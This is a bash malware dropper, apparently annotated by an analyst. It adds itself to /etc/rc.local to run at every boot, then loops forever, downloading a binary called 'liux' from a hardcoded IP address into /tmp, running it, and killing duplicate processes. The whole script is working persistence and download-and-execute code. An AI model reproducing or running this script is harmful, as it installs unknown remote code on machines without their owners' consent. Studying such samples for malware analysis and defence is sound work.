#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qun:10776622
#                2016-06-14

# If not there, try to run it.
if [ "sh /etc/chongfu.sh &" = "$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/chongfu.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    # find whether /tmp/liux is used by a process
    Centos_sshd_killn=$(ps aux | grep "/tmp/liux" | grep -v grep | wc -l)
    # not used
    if [ $Centos_sshd_killn -eq 0 ]; then
        # if not exsit
        if [ ! -f "/tmp/liux" ]; then
            # Here it tries to do sth. 
            # First, it needs to download 
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P . http://60.250.99.131:9998/liux
                ./wget -P /tmp/  http://60.250.99.131:9998/liux &> /dev/null
                # here it downloaded the file
                chmod 755 /tmp/liux
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        # execute this file. -- We don't know what it is
        /tmp/liux &
        #./liux &
    
    # Otherwise it has 
    elif [ $Centos_sshd_killn -gt 1 ]; then
        for killed in $(ps aux | grep "liux" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$($Centos_sshd_killn-1)
            if [ $Centos_sshd_killn -eq 1 ]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/liux" | grep -v grep | wc -l)
    if [ $Centos_ssh_killn -eq 0 ]; then
        if [ ! -f "/tmp/liux" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P .  http://60.250.99.131:9998/liux
                ./wget -P /tmp/  http://60.250.99.131:9998/liux &> /dev/null
                chmod 755 /tmp/liux
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/liux &
        #./liux &
    elif [ $Centos_ssh_killn -gt 1 ]; then
        for killed in $(ps aux | grep "liux" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$($Centos_ssh_killn)
            if [ $Centos_ssh_killn -eq 1 ]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 999
done